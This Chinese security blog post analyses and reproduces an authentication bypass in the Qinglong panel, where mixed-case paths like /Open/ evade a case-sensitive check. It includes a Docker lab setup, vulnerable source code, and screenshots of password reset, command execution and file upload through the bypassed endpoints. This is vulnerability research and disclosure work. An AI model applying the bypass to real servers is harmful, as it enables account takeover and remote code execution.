#  青龙面板鉴权绕过漏洞 | 文件上传、RCE、密码重置、信息泄露复现&研究  
原创 404号浪漫
                        404号浪漫  404号浪漫   2026-02-28 19:39  
  
0x0 背景介绍  
  
青龙面板存在严重鉴权绕过漏洞。该漏洞源于  
/back/loaders/express.ts  
   
文件中第  
54  
行的鉴权中间件逻辑缺陷：其使用  
req.path.startsWith(/open/)  
判断是否跳过鉴权，但  
Express  
框架默认路由匹配不区分大小写，而该检查仅匹配小写路径。攻击者可通过构造如  
/Open/、/OPEN/、/oPeN/  
等大小写混合路径，完全绕过身份验证机制。由于  
/open/  
路径经  
 rewrite  
 规则映射至   
api  
，攻击者可直接访问原本需认证的敏感接口，包括系统重置、脚本上传与执行等高危功能。  
## 漏洞详情  
<table><thead><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;border: 0px;font: inherit;vertical-align: baseline;visibility: visible;"><th data-colwidth="107" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 10px 12px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border-top: none;border-right: 1px solid rgb(224, 224, 224);border-bottom: 1px solid rgb(224, 224, 224);border-left: none;border-image: none 100% / 1 / 0 stretch;background: rgb(237, 237, 237);max-width: 448px;box-sizing: border-box;font: bold 14px / 1.6 &#34;PingFang SC&#34;, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Ubuntu, &#34;Helvetica Neue&#34;, Helvetica, Arial, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, &#34;Source Han Sans CN&#34;, sans-serif;vertical-align: middle;color: rgba(0, 0, 0, 0.9);text-align: center;white-space: normal;visibility: visible;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span textstyle="" style="font-size: 15px;">漏洞类型</span></span></section></th><th data-colwidth="226" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 10px 12px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border-top: none;border-right: 1px solid rgb(224, 224, 224);border-bottom: 1px solid rgb(224, 224, 224);border-left: 1px solid rgb(224, 224, 224);border-image: none 100% / 1 / 0 stretch;background: rgb(237, 237, 237);max-width: 448px;box-sizing: border-box;font: bold 14px / 1.6 &#34;PingFang SC&#34;, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Ubuntu, &#34;Helvetica Neue&#34;, Helvetica, Arial, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, &#34;Source Han Sans CN&#34;, sans-serif;vertical-align: middle;color: rgba(0, 0, 0, 0.9);text-align: center;white-space: normal;visibility: visible;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span textstyle="" style="font-size: 15px;">影响版本</span></span></section></th><th data-colwidth="159" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 10px 12px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border-top: none;border-right: 1px solid rgb(224, 224, 224);border-bottom: 1px solid rgb(224, 224, 224);border-left: 1px solid rgb(224, 224, 224);border-image: none 100% / 1 / 0 stretch;background: rgb(237, 237, 237);max-width: 448px;box-sizing: border-box;font: bold 14px / 1.6 &#34;PingFang SC&#34;, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Ubuntu, &#34;Helvetica Neue&#34;, Helvetica, Arial, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, &#34;Source Han Sans CN&#34;, sans-serif;vertical-align: middle;color: rgba(0, 0, 0, 0.9);text-align: center;white-space: normal;visibility: visible;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span textstyle="" style="font-size: 15px;">利用复杂度</span></span></section></th><th data-colwidth="253" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 10px 12px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border-top: none;border-right: none;border-bottom: 1px solid rgb(224, 224, 224);border-left: 1px solid rgb(224, 224, 224);border-image: none 100% / 1 / 0 stretch;background: rgb(237, 237, 237);max-width: 448px;box-sizing: border-box;font: bold 14px / 1.6 &#34;PingFang SC&#34;, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Ubuntu, &#34;Helvetica Neue&#34;, Helvetica, Arial, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, &#34;Source Han Sans CN&#34;, sans-serif;vertical-align: middle;color: rgba(0, 0, 0, 0.9);text-align: center;white-space: normal;visibility: visible;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span textstyle="" style="font-size: 15px;">CVE编号</span></span></section></th></tr></thead><tbody><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;border: 0px;font: inherit;vertical-align: baseline;visibility: visible;"><td data-colwidth="107" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 10px 12px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border-top: 1px solid rgb(224, 224, 224);border-right: 1px solid rgb(224, 224, 224);border-bottom: none;border-left: none;border-image: none 100% / 1 / 0 stretch;max-width: 448px;box-sizing: border-box;font: 400 14px / 1.6 &#34;PingFang SC&#34;, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Ubuntu, &#34;Helvetica Neue&#34;, Helvetica, Arial, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, &#34;Source Han Sans CN&#34;, sans-serif;vertical-align: middle;background-color: rgb(255, 255, 255);color: rgba(0, 0, 0, 0.9);text-align: center;white-space: normal;visibility: visible;"><p style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;visibility: visible;"><span leaf="">权限绕过</span></p></td><td data-colwidth="226" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 10px 12px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border-top: 1px solid rgb(224, 224, 224);border-right: 1px solid rgb(224, 224, 224);border-bottom: none;border-left: 1px solid rgb(224, 224, 224);border-image: none 100% / 1 / 0 stretch;max-width: 448px;box-sizing: border-box;font: 400 14px / 1.6 &#34;PingFang SC&#34;, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Ubuntu, &#34;Helvetica Neue&#34;, Helvetica, Arial, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, &#34;Source Han Sans CN&#34;, sans-serif;vertical-align: middle;background-color: rgb(255, 255, 255);color: rgba(0, 0, 0, 0.9);text-align: center;white-space: normal;visibility: visible;"><p style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"> ≤</span><span leaf="">2.20.1</span></p></td><td data-colwidth="159" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 10px 12px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border-top: 1px solid rgb(224, 224, 224);border-right: 1px solid rgb(224, 224, 224);border-bottom: none;border-left: 1px solid rgb(224, 224, 224);border-image: none 100% / 1 / 0 stretch;max-width: 448px;box-sizing: border-box;font: 400 14px / 1.6 &#34;PingFang SC&#34;, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Ubuntu, &#34;Helvetica Neue&#34;, Helvetica, Arial, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, &#34;Source Han Sans CN&#34;, sans-serif;vertical-align: middle;background-color: rgb(255, 255, 255);color: rgba(0, 0, 0, 0.9);text-align: center;white-space: normal;visibility: visible;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span textstyle="" style="font-size: 15px;">低</span></span></section></td><td data-colwidth="253" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 10px 12px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border-top: 1px solid rgb(224, 224, 224);border-right: none;border-bottom: none;border-left: 1px solid rgb(224, 224, 224);border-image: none 100% / 1 / 0 stretch;max-width: 448px;box-sizing: border-box;font: 400 14px / 1.6 &#34;PingFang SC&#34;, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Ubuntu, &#34;Helvetica Neue&#34;, Helvetica, Arial, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, &#34;Source Han Sans CN&#34;, sans-serif;vertical-align: middle;background-color: rgb(255, 255, 255);color: rgba(0, 0, 0, 0.9);text-align: center;white-space: normal;visibility: visible;"><p style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span textstyle="" style="font-size: 15px;">无</span></span></p></td></tr></tbody></table>  
**攻击效果**  
- **绕过权限，执行命令、重置账密、控制服务器**  
。  
  
**0x1 环境搭建（Ubuntu24）**  
### 1.1-Ubuntu24+Docker搭建配置  
```
#1、创建项目
mkdir -p ~/qinglong-2.20.1/data && cd ~/qinglong-2.20.1
#2、创建docker-compose.yml
version: '3'

services:
  qinglong:
    image: whyour/qinglong:2.20.1-debian
    container_name: qinglong
    hostname: qinglong
    restart: unless-stopped
    ports:
      - "5700:5700"
    volumes:
      - ./data:/ql/data
    environment:
      - QlBaseUrl=/
    networks:
      - qinglong_net

networks:
  qinglong_net:
    driver: bridge

#3、启动服务
docker compose up -d
#4、查看启动日志
docker logs -f qinglong
#5、访问搭建
访问IP：5700后进行默认搭建就可以，邮箱可以跳过不设置
```  
  
  
****  
**0x2 漏洞复现**  
### 2.1-YML复现  
- 只检测命令执行  
  
```
https://github.com/Kai-One001/cve-/blob/main/Qing-long-Authentication-Bypass-2026.yml
```  
  
   
  
  
### 2.2-手动复现  
  
久违的章节，就是这次的工作量太大了，燃尽了  
- 2.2.1密码重置  
  
![](https://mmbiz.qpic.cn/mmbiz_png/eefCd8vibaic1mX3xITszMYuiba9LQTbk5JmibMvYAjVapdb9M8OSQfvxt322l82utwsbcJQTpzpgkxoywaadFWLIjacTYCG404QAsgjhp0y1ibc/640?wx_fmt=png&from=appmsg "")  
- 2.2.2重置后的密码登录成功   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/eefCd8vibaic23jxKUYIyOgcacdgdhHqAF9NicG9aj3R62yiaStwulicyiaSFURGyvkG6kPiaiclhQwoYtRlibdWyibcdw6icqgJvQ3O0C6MtGOFT7BsFw/640?wx_fmt=png&from=appmsg "")  
- 2.2.3未授权RCE-文件落地方式    
  
![](https://mmbiz.qpic.cn/mmbiz_png/eefCd8vibaic3bqF6VibF0pZ8hCRS1odgQtEo9F9uBbiaHiaPtk92EaqQx9CJjiaozNCJDyiapbOLtWjP9Y2EBovGDsszZaIr7zFOwkP5jEmjySGbE/640?wx_fmt=png&from=appmsg "")  
- 2.2.4未授权RCE-文件落地方式：服务器验证       
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/eefCd8vibaic23heKLz9JUc8rmlrrzjbYFLuWnk3eUxW5WI9HiaU4fEkRyMsQgNedfoOia6lvH0G8gpVLibacuwXBPiclfefmJI3vEPCPwazqwFLY/640?wx_fmt=png&from=appmsg "")  
- 2.2.5未授权直接命令执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/eefCd8vibaic1VwaDNxtrA9XiaQSA9hIic7DmQk4HcOibpFYwSVKWgOk4w9icicS7eLJ1iaUsCm2ub6iaNmfLTOc7zA72Sc2s83xwscbtiaiaib376zP68k/640?wx_fmt=png&from=appmsg "")  
- 2.2.6未授权命令执行-其实是接口不同（本质都一样，一个漏洞）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/eefCd8vibaic0nrSjicSujXhicrhEKUgjcOeYMovOtthSeFQjms5OXXKdMbjrtO3rOq2x0ZUC7acxfibBknQdPe79HaRrpe8ibeeib5E5dVLk3szHs/640?wx_fmt=png&from=appmsg "")  
- 2.2.7任意文件上传-头像上传  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/eefCd8vibaic2HADBpny6pshtYBajy3kz9r9Cia8O7LzpTUqGVVFIAmUxiax5GORbh13ezz4jEXJ1Fnpxa17k0WkaCdezPPexl50jdg6tP9GVIk/640?wx_fmt=png&from=appmsg "")  
- 2.2.8未授权导出敏感数据  
  
![](https://mmbiz.qpic.cn/mmbiz_png/eefCd8vibaic1LrQcyADovNrtvVeQYLB5XUD0rJt6iaGxFOsnxfmdvHgelYSSvGoSm5gxxSoKxxPuibahae3hB7H4yUNVnKO2gOP8VQxVtLicQUU/640?wx_fmt=png&from=appmsg "")  
### 2.3-复现流量特征 (PCAP)  
  
基本都是明文流量，就不全截图了  
- 2.3.1未授权RCE-文件落地方式  
  
![](https://mmbiz.qpic.cn/mmbiz_png/eefCd8vibaic3icbylIia9HXHAjAkfxbKibq6vPXyXlvlPjwMwbEkdTktIWnh3cIrketDX2rKCf5SDoBnlSWPSrLj2FsxBibLuKIFYiaaRPJWiao4tc/640?wx_fmt=png&from=appmsg "")  
- 2.3.2直接命令执行     
  
   
  
  
  
  
0x3 漏洞原理分析  
  
同样根据漏洞公开信息定位到   
/back/loaders/express.ts  
 文件，  
54行  
代码：  
  
3.1-漏洞入口  
```
// back/loaders/express.ts
  app.use(async (req: Request, res, next) => {
    if (!['/open/', '/api/'].some((x) => req.path.startsWith(x))) {
      return next();
    }

    const headerToken = getToken(req);
    if (req.path.startsWith('/open/')) {
      const apps = await shareStore.getApps();
      const doc = apps?.filter((x) =>
        x.tokens?.find((y) => y.value === headerToken),
      )?.[0];
      if (doc && doc.tokens && doc.tokens.length > 0) {
        const currentToken = doc.tokens.find((x) => x.value === headerToken);
        const keyMatch = req.path.match(/\/open\/([a-z]+)\/*/);
        const key = keyMatch && keyMatch[1];
        if (
          doc.scopes.includes(key as any) &&
          currentToken &&
          currentToken.expiration >= Math.round(Date.now() / 1000)
        ) {
          return next();
        }
      }
    }

    const originPath = `${req.baseUrl}${req.path === '/' ? '' : req.path}`;
    if (
      !headerToken &&
      originPath &&
      config.apiWhiteList.includes(originPath)
    ) {
      return next();
    }

    const authInfo = await shareStore.getAuthInfo();
    if (isValidToken(authInfo, headerToken, req.platform)) {
      return next();
    }

    const errorCode = headerToken ? 'invalid_token' : 'credentials_required';
    const errorMessage = headerToken
      ? 'jwt malformed'
      : 'No authorization token was found';
    const err = new UnauthorizedError(errorCode, { message: errorMessage });
    next(err);
  });
//静态目录暴露
app.get(`${config.api.prefix}/env.js`, serveEnv);

app.use(`${config.api.prefix}/static`, express.static(config.uploadPath));
```  
  
- 开发者的初衷是只对以小写  
/open/  
或   
/api/  
开头的请求进行身份验证，其余路径均视为公开资源并直接放行。  
  
- 不过问题在于  
JavaScript  
的   
startsWith  
方法是严格区分大小写的。  
  
- 只要攻击者把   
URL  
 中的   
/open/  
 或   
/api/  
 改成任意大小写混合形式（如   
/Open/  
、  
/API/  
），就能骗过这个检查，让它以为这不是受保护的路径，从而直接放行。  
  
- 关于静态目录：所有上传到   
  
config.uploadPath  
（  
data/upload/  
）  
的文件，通过   
/api/static/  
可直接访问。  
- 伪逻辑示意图  
：  
  
```
请求：/Open/scripts (注意 O 是大写)
判断：'/Open/scripts'.startsWith('/open/') → false (因为 'O' != 'o')
结果：!false 为 true，进入 if 块。
动作：执行 return next()。
后果：直接返回，下方的所有鉴权代码（第 60 行开始的 Token 检查）全部被跳过！ （漏洞触发）
```  
  
  
  
3.2-  
路由匹配机制  
  
在   
express.ts  
 代码中的底部有一行路由挂载：  
```
// back/loaders/express.ts (Line 123)
app.use(rewrite('/open/*', '/api/$1'));
app.use(config.api.prefix, routes());
```  
- 使用   
express-urlrewrite  
进行的实现，其特点路由匹配默认是  
case insensitive  
 (不区分大小写)  
 的。  
  
- 相当于鉴权层（  
54  
行代码）是绕过鉴权，而路由层（  
123  
行代码）则是不区分大小写，直接进入业务逻辑。  
  
- 这时就可以绕过鉴权逻辑进入到敏感资源了，那么看看可以都做些什么。  
  
```
// back/loaders/express.ts
import routes from '../api'; 
// ...
app.use(config.api.prefix, routes());
```  
  
- 回到代码能看到   
routes()  
 包含了哪些，其中关键是指向了  
   
back/api/index.ts  
 文件（在   
Node.js/TypeScript  
中，如果引用一个文件夹（如  
./api  
）而没有指定具体文件名，默认会查找该文件夹下的   
index.ts  
(或  
index.js  
)  
 文件）。  
  
3.3  
-扩大战果  
```
import { Router } from 'express';
// 引入各个业务模块
import user from './user';       // 用户管理 (头像、登录、信息)
import env from './env';         // 环境变量 (敏感密钥)
import config from './config';   // 系统配置
import log from './log';         // 日志查看
import cron from './cron';       // 定时任务 (可用来持久化执行恶意脚本)
import script from './script';   // 脚本管理 (上传、运行代码 -> RCE)
import open from './open';       // 开放接口 (通常用于第三方应用)
import dependence from './dependence'; // 依赖管理
import system from './system';   // 系统管理 (重置密码、初始化 -> 账号接管)
import subscription from './subscription'; // 订阅
import update from './update';   // 更新
import health from './health';   // 健康检查

export default () => {
  const app = Router();
  //  将所有模块挂载到路由上
  user(app);
  env(app);
  config(app);
  log(app);
  cron(app);
  script(app);      //  高危模块已挂载
  open(app);
  dependence(app);
  system(app);      //  高危模块已挂载
  subscription(app);
  update(app);
  health(app);

  return app;
};
```  
- 可以看到很多模块，我们跟踪部分模块看看：  
  
<table><thead><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);"><th align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;background-color: rgb(239, 243, 245);font-weight: 700;"><section><span leaf="">模块</span></section></th><th align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;background-color: rgb(239, 243, 245);font-weight: 700;"><section><span leaf="">对应文件</span></section></th><th align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;background-color: rgb(239, 243, 245);font-weight: 700;"><section><span leaf="">风险描述</span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);"><td align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;"><code style="box-sizing: border-box;font-family: &#34;Source Code Pro&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;Anonymous Pro&#34;, &#34;Droid Sans Mono&#34;, Menlo, Monaco, Consolas, Inconsolata, Courier, monospace, &#34;PingFang SC&#34;, &#34;Microsoft YaHei&#34;, sans-serif;font-size: 14px;background-color: rgb(249, 242, 244);border-radius: 2px;padding: 2px 4px;color: rgb(199, 37, 78);line-height: 22px;white-space: normal;word-break: normal !important;"><span leaf="">script(app)</span></code></td><td align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;"><code style="box-sizing: border-box;font-family: &#34;Source Code Pro&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;Anonymous Pro&#34;, &#34;Droid Sans Mono&#34;, Menlo, Monaco, Consolas, Inconsolata, Courier, monospace, &#34;PingFang SC&#34;, &#34;Microsoft YaHei&#34;, sans-serif;font-size: 14px;background-color: rgb(249, 242, 244);border-radius: 2px;padding: 2px 4px;color: rgb(199, 37, 78);line-height: 22px;white-space: normal;word-break: normal !important;"><span leaf="">back/api/script.ts</span></code></td><td align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;"><section><span leaf="">脚本的增删改查和执行（RCE）</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(247, 247, 247);border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);"><td align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;"><code style="box-sizing: border-box;font-family: &#34;Source Code Pro&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;Anonymous Pro&#34;, &#34;Droid Sans Mono&#34;, Menlo, Monaco, Consolas, Inconsolata, Courier, monospace, &#34;PingFang SC&#34;, &#34;Microsoft YaHei&#34;, sans-serif;font-size: 14px;background-color: rgb(249, 242, 244);border-radius: 2px;padding: 2px 4px;color: rgb(199, 37, 78);line-height: 22px;white-space: normal;word-break: normal !important;"><span leaf="">system(app)</span></code></td><td align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;"><code style="box-sizing: border-box;font-family: &#34;Source Code Pro&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;Anonymous Pro&#34;, &#34;Droid Sans Mono&#34;, Menlo, Monaco, Consolas, Inconsolata, Courier, monospace, &#34;PingFang SC&#34;, &#34;Microsoft YaHei&#34;, sans-serif;font-size: 14px;background-color: rgb(249, 242, 244);border-radius: 2px;padding: 2px 4px;color: rgb(199, 37, 78);line-height: 22px;white-space: normal;word-break: normal !important;"><span leaf="">back/api/system.ts</span></code></td><td align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;"><section><span leaf="">管理员设置、初始化、重置密码（账号接管）</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(255, 255, 255);border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);"><td align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;"><code style="box-sizing: border-box;font-family: &#34;Source Code Pro&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;Anonymous Pro&#34;, &#34;Droid Sans Mono&#34;, Menlo, Monaco, Consolas, Inconsolata, Courier, monospace, &#34;PingFang SC&#34;, &#34;Microsoft YaHei&#34;, sans-serif;font-size: 14px;background-color: rgb(249, 242, 244);border-radius: 2px;padding: 2px 4px;color: rgb(199, 37, 78);line-height: 22px;white-space: normal;word-break: normal !important;"><span leaf="">cron(app)</span></code></td><td align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;"><code style="box-sizing: border-box;font-family: &#34;Source Code Pro&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;Anonymous Pro&#34;, &#34;Droid Sans Mono&#34;, Menlo, Monaco, Consolas, Inconsolata, Courier, monospace, &#34;PingFang SC&#34;, &#34;Microsoft YaHei&#34;, sans-serif;font-size: 14px;background-color: rgb(249, 242, 244);border-radius: 2px;padding: 2px 4px;color: rgb(199, 37, 78);line-height: 22px;white-space: normal;word-break: normal !important;"><span leaf="">back/api/cron.ts</span></code></td><td align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;"><section><span leaf="">定时任务管理（持久化恶意脚本）</span></section></td></tr><tr style="box-sizing: border-box;background-color: rgb(247, 247, 247);border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-image: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);"><td align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;"><code style="box-sizing: border-box;font-family: &#34;Source Code Pro&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;Anonymous Pro&#34;, &#34;Droid Sans Mono&#34;, Menlo, Monaco, Consolas, Inconsolata, Courier, monospace, &#34;PingFang SC&#34;, &#34;Microsoft YaHei&#34;, sans-serif;font-size: 14px;background-color: rgb(249, 242, 244);border-radius: 2px;padding: 2px 4px;color: rgb(199, 37, 78);line-height: 22px;white-space: normal;word-break: normal !important;"><span leaf="">env(app)</span></code></td><td align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;"><code style="box-sizing: border-box;font-family: &#34;Source Code Pro&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;Anonymous Pro&#34;, &#34;Droid Sans Mono&#34;, Menlo, Monaco, Consolas, Inconsolata, Courier, monospace, &#34;PingFang SC&#34;, &#34;Microsoft YaHei&#34;, sans-serif;font-size: 14px;background-color: rgb(249, 242, 244);border-radius: 2px;padding: 2px 4px;color: rgb(199, 37, 78);line-height: 22px;white-space: normal;word-break: normal !important;"><span leaf="">back/api/env.ts</span></code></td><td align="left" style="box-sizing: border-box;border: 1px solid rgb(221, 221, 221);padding: 8px;color: rgb(79, 79, 79);font-size: 14px;line-height: 22px;vertical-align: middle;word-break: normal !important;"><section><span leaf="">环境变量管理（敏感信息泄露）</span></section></td></tr></tbody></table>  
3.4-  
管理员密码重置 (账号接管)  
  
PS：查询重置相关代码，找到   
/auth/reset  
的代码：  
```
// back/api/system.ts (Line 390-404)
route.put(
  '/auth/reset',  // 1. 路由路径：对应 /api/system/auth/reset
  celebrate({    // 2. 参数校验
    body: Joi.object({
      retries: Joi.number().optional(),
      twoFactorActivated: Joi.boolean().optional(),
      password: Joi.string().optional(),
      username: Joi.string().optional(),
    }),
  }),
  async (req: Request, res: Response, next: NextFunction) => {
    try {
      // 3. 核心业务逻辑
      const userService = Container.get(UserService);
      await userService.resetAuthInfo(req.body); // 直接调用服务层方法

      res.send({ code: 200, message: '更新成功' });
    } catch (e) {
      return next(e);
    }
  },
);
```  
  
PS：前面已经提到了   
JWT  
校验绕过和跳过  
Token  
和权限检查，就不赘述了，后续也都直接看对应代码的问题。  
